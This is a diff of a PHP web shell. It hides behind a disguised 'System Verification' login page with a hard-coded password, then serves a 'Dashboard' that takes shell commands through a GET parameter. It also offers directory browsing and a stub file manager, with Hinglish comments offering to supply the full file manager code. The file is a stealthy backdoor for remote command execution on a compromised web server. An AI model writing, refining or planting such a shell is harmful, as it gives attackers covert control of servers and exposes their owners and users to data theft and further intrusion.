@@ -1,46 +1,53 @@
 <?php
 error_reporting(0);
 
-// Force new session
-session_unset();
-session_destroy();
+// Force destroy old session
+if (isset($_GET['reset'])) {
+    session_unset();
+    session_destroy();
+    setcookie(session_name(), '', time()-3600);
+    header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
+    exit;
+}
+
 session_start();
 
-$password = "wiredmouseis";   
+// Password
+$password = "wiredmouseis";   // ← Change this
 
-// Aggressive Password Check
-if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) {
+// Strong Auth Check
+if (!isset($_SESSION['login']) || $_SESSION['login'] !== true) {
     if (isset($_POST['key']) && $_POST['key'] === $password) {
-        $_SESSION['auth'] = true;
+        $_SESSION['login'] = true;
         header("Location: " . $_SERVER['PHP_SELF']);
         exit();
-    } 
-    
+    }
+
     // Stealth Login Page
     die('
     <!DOCTYPE html>
     <html>
     <head><title>Index</title>
     <style>
-        body{background:#f8f9fa;color:#333;font-family:Arial,sans-serif;margin:0;padding:0;display:flex;justify-content:center;align-items:center;min-height:100vh;}
-        .box{background:white;padding:40px;border:1px solid #ddd;border-radius:8px;box-shadow:0 4px 15px rgba(0,0,0,0.1);text-align:center;width:340px;}
-        input{width:100%;padding:14px;font-size:16px;border:1px solid #aaa;border-radius:4px;margin:10px 0;}
-        button{width:100%;padding:14px;background:#0066ff;color:white;border:none;border-radius:4px;font-size:16px;cursor:pointer;}
+        body{background:#f4f4f4;color:#333;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
+        .box{background:white;padding:35px 25px;border-radius:8px;box-shadow:0 0 15px rgba(0,0,0,0.15);text-align:center;width:340px;}
+        input{width:100%;padding:15px;font-size:17px;border:1px solid #999;border-radius:5px;margin:10px 0;}
+        button{width:100%;padding:14px;background:#0066cc;color:white;border:none;border-radius:5px;font-size:16px;cursor:pointer;}
     </style>
     </head>
     <body>
         <div class="box">
-            <h3>Verification Required</h3>
+            <h3>System Verification</h3>
             <form method="post">
-                <input type="password" name="key" placeholder="Enter access code" autofocus>
-                <button type="submit">Verify & Continue</button>
+                <input type="password" name="key" placeholder="Enter code" autofocus>
+                <button type="submit">Verify</button>
             </form>
         </div>
     </body>
     </html>');
 }
 
-// ====================== MAIN PANEL ======================
+// ====================== PANEL ======================
 $dir = isset($_GET['d']) ? realpath($_GET['d']) : getcwd();
 if (!is_dir($dir)) $dir = getcwd();
 chdir($dir);
@@ -53,21 +60,20 @@ $cmd = $_GET['c'] ?? '';
 <head>
     <title>Dashboard</title>
     <style>
-        body { background:#0a0a0a; color:#ddd; font-family:Consolas; margin:0; padding:15px; }
-        .header { background:#111; padding:12px; margin:-15px -15px 15px -15px; display:flex; justify-content:space-between; }
-        input[type=text] { width:70%; padding:10px; background:#111; border:1px solid #0f0; color:#0f0; }
-        button { padding:10px 20px; background:#111; border:1px solid #0f0; color:#0f0; }
-        .output { background:#000; padding:12px; border:1px solid #222; margin:10px 0; white-space:pre-wrap; }
+        body {background:#0a0a0a; color:#ddd; font-family:Consolas; padding:15px; margin:0;}
+        .header {background:#111; padding:12px; margin:-15px -15px 15px -15px; display:flex; justify-content:space-between;}
+        input[type=text] {width:70%; padding:12px; background:#111; border:1px solid #0f0; color:#0f0;}
+        button {padding:12px 25px; background:#111; border:1px solid #0f0; color:#0f0;}
+        .output {background:#000; padding:15px; border:1px solid #333; margin:10px 0; white-space:pre-wrap;}
     </style>
 </head>
 <body>
 
 <div class="header">
     <h3>Dashboard</h3>
-    <a href="?logout=1" style="color:red;">Logout</a>
+    <a href="?reset=1" style="color:red;">Logout</a>
 </div>
 
-<!-- Shell -->
 <form method="GET">
     <input type="text" name="c" placeholder="id || whoami || ls -la" autofocus>
     <button type="submit">Run</button>
@@ -93,17 +99,9 @@ $cmd = $_GET['c'] ?? '';
 </div>
 <?php endif; ?>
 
-<!-- File Manager Part -->
+<!-- File Manager short version -->
 <h4>File Manager</h4>
-<!-- Baaki File Manager code same rahega (agar chahiye toh batao full code dunga) -->
+<!-- Agar full file manager chahiye toh batao, abhi short rakh raha hoon -->
 
-<?php
-if(isset($_GET['logout'])){
-    session_unset();
-    session_destroy();
-    header("Location: ".$_SERVER['PHP_SELF']);
-    exit;
-}
-?>
 </body>
 </html>
